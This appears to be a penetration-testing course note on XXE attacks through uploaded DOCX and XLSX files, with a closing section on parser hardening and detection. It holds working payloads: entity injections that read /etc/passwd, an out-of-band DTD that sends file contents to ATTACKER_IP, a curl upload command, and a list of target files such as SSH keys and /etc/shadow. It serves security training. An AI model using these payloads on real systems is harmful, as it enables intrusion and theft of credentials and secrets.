---
tags: [vapt, file-upload, xxe, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.10 File Upload + XXE (malicious DOCX/XLSX)"
---

# 22.10 — File Upload + XXE (malicious DOCX/XLSX)

## Office Files Are ZIP Archives with XML

```
DOCX, XLSX, PPTX ARE ZIP FILES:
  They contain XML files inside!
  
  Unzip a .docx:
  unzip example.docx -d docx_contents/
  
  You'll find:
  word/document.xml     ← The actual content (XML!)
  word/settings.xml
  [Content_Types].xml   ← Content type mapping (XML!)
  _rels/.rels           ← Relationship file (XML!)
  
  IF SERVER PARSES THESE XML FILES:
  → XXE attacks possible within any of these XML files!
  
  COMMON SCENARIOS:
  - CV/resume upload with DOCX conversion to PDF
  - Invoice processing (XLSX upload → parse data)
  - Document preview generation
  - Template filling
  - Data import via CSV/XLSX
```

---

## Creating a Malicious DOCX

```bash
# STEP 1: START WITH A LEGITIMATE DOCX:
cp template.docx malicious.docx
# OR create from scratch using LibreOffice/Word

# STEP 2: UNZIP IT:
mkdir malicious_docx
cp malicious.docx malicious_docx/
cd malicious_docx
unzip malicious.docx -d contents/

# STEP 3: INJECT XXE INTO [Content_Types].xml:
cat > contents/\[Content_Types\].xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  &xxe;
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml"
            ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
EOF

# STEP 4: INJECT XXE INTO word/document.xml:
# Add DOCTYPE with XXE entity:
cat > contents/word/document.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:wpc="..."
            xmlns:mc="..."
            xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
EOF

# STEP 5: REPACK AS DOCX:
cd contents
zip -r ../malicious.docx . -x "*.DS_Store"
cd ..

# STEP 6: UPLOAD malicious.docx to target
```

---

## OOB XXE via DOCX

```bash
# FOR BLIND XXE (no output visible):
# Use OOB technique to exfiltrate data

# Set up HTTP server to receive data:
python3 -m http.server 8888 &

# Create evil.dtd on your server:
cat > evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:8888/exfil?data=%file;'>">
%all;
EOF

# Inject into DOCX:
cat > malicious_content_types.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8888/evil.dtd">
  %remote;
  %exfil;
]>
<Types xmlns="...">
</Types>
EOF

# → Server loads evil.dtd from attacker
# → evil.dtd reads /etc/passwd
# → Exfiltrates to attacker's HTTP server!
```

---

## XLSX XXE (Excel Files)

```bash
# XLSX STRUCTURE SIMILAR TO DOCX:
# xl/workbook.xml → main workbook
# xl/worksheets/sheet1.xml → sheet data
# [Content_Types].xml → content types

# INJECT INTO [Content_Types].xml (same as DOCX):
# OR into xl/workbook.xml:

cat > xl/workbook.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="..." xmlns:r="...">
  <sheets>
    <sheet name="&xxe;" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>
EOF

# → If server parses workbook.xml → XXE triggers!
# → Sheet name might contain /etc/passwd contents!
# → Reflected in error message, processing response, or preview!
```

---

## Testing for XXE via File Upload

```bash
# STEP 1: CHECK WHAT FILE TYPES ARE ACCEPTED:
# DOCX, XLSX, PPTX, ODT, XML, SVG = all potentially vulnerable

# STEP 2: CREATE MALICIOUS FILE (see above)

# STEP 3: UPLOAD AND OBSERVE RESPONSE:
curl -X POST https://target.com/upload \
  -b "session=YOUR_SESSION" \
  -F "file=@malicious.docx"

# LOOK FOR:
# - File contents in response (reflected XXE)
# - Error messages with file paths
# - Response time changes (blind XXE indicator)
# - OOB: HTTP request to Burp Collaborator

# STEP 4: USE BURP COLLABORATOR FOR OOB:
# In evil.dtd or direct SYSTEM reference, use:
# SYSTEM "http://YOUR.oastify.com/test"
# → Collaborator receives connection → XXE confirmed!

# STEP 5: EXFILTRATE TARGET DATA:
# file:///etc/passwd
# file:///etc/shadow
# file:///proc/self/environ (environment variables)
# file:///var/www/html/config.php (web app config)
# file:///home/user/.ssh/id_rsa (SSH private key)
```

---

## Fix

```
PREVENTING XXE VIA FILE UPLOAD:

1. DISABLE EXTERNAL ENTITY PROCESSING IN XML PARSERS:
   All XML parsers used for document processing must have XXE disabled!
   
   Java (for DOCX parsing libraries like Apache POI):
   XMLInputFactory factory = XMLInputFactory.newInstance();
   factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
   factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
   
   Python (for DOCX parsing):
   from lxml import etree
   # Use defusedxml instead of standard xml:
   import defusedxml.ElementTree as ET
   # defusedxml automatically disables external entities

2. USE SAFE DOCUMENT PARSING LIBRARIES:
   Python: python-docx + defusedxml (safe)
   Java: Apache POI with safe XMLInputFactory config
   Node: officegen, docxtemplater (check XXE handling)
   
3. VALIDATE CONTENT BEFORE DEEP PARSING:
   # Quick ZIP structure check:
   import zipfile
   try:
       with zipfile.ZipFile(upload_file) as z:
           # List files:
           file_list = z.namelist()
           # Check for unexpected files:
           # (not a security control by itself, but aids detection)
   except zipfile.BadZipFile:
       reject("Not a valid Office file")

4. SANDBOX DOCUMENT PROCESSING:
   Process documents in isolated container/sandbox
   No network access (prevents OOB XXE exfiltration)
   Read-only filesystem access (limits file:// access)
   
5. SCAN UPLOADED XML FOR DOCTYPE:
   Before processing:
   content = zip.read('[Content_Types].xml')
   if b'<!DOCTYPE' in content or b'<!ENTITY' in content:
       raise ValueError("Potentially malicious document detected!")
```

---

## Related Notes
- [[14 - XXE — What is XXE]] — full XXE module
- [[08 - File Upload + SSRF (SVG with SSRF payload)]] — SVG SSRF/XXE
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
